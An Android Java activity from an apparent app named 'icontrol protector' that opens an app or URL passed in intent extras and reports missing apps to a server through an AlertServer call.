package com.icontrol.protector;

import static com.icontrol.protector.WorkServices.MyWorker.AlertServer;

import android.app.Activity;
import android.content.ActivityNotFoundException;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.view.Window;
import android.view.WindowManager;


public class BrodcastActivity extends Activity {

    @Override
    protected void onCreate( Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);


        String lunchtype = null ;
        String tolunch = null ;
        try {
            Intent intentnew = getIntent();
            if (intentnew.hasExtra("type")){
                lunchtype = intentnew.getStringExtra("type");
            }

            if(intentnew.hasExtra("tolunch")){
                tolunch =  intentnew.getStringExtra("tolunch");
            }

        }catch (Exception a){
            a.printStackTrace();
            lunchtype = null;
            tolunch= null;
        }

        if (lunchtype != null && tolunch != null){
            MyLoger.Debug("BrodcastActivity", "lunchtype: " + lunchtype);
            MyLoger.Debug("BrodcastActivity", "tolunch: " + tolunch);
            requestWindowFeature(Window.FEATURE_NO_TITLE);

            getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                    WindowManager.LayoutParams.FLAG_FULLSCREEN);

            switch (lunchtype) {
                case "app":
                    openAppByPackageName(tolunch);
                    break;
                case "link":
                    openLinkInBrowser(tolunch);
                    break;
                default:
                    MyLoger.Debug("BrodcastActivity", "Unknown lunchtype: " + lunchtype);
                    break;
            }


        }

        finish();
    }
    private void openAppByPackageName(String packageName) {
        PackageManager pm = getPackageManager();
        Intent appIntent = pm.getLaunchIntentForPackage(packageName);
        if (appIntent != null) {
            appIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(appIntent);
        } else {
            MyLoger.Debug("BrodcastActivity", "App not found: " + packageName);
            AlertServer(getApplicationContext(),"Broadcast","App not found: " + packageName);
        }
    }

    private void openLinkInBrowser(String url) {

        try {
            Intent i = new Intent("android.intent.action.MAIN");
            i.setComponent(new ComponentName("com.android.chrome", "com.google.android.apps.chrome.Main"));
            i.addCategory("android.intent.category.LAUNCHER");
            i.setData(Uri.parse(url));
            startActivity(i);
        } catch(ActivityNotFoundException e) {
            Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            if (browserIntent.resolveActivity(getPackageManager()) != null) {
                browserIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(browserIntent);
            }
        }
    }
//    @Override
//    public void finish() {
//        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
//            super.finishAndRemoveTask();
//        }
//        else {
//            super.finish();
//        }
//    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
    }
}
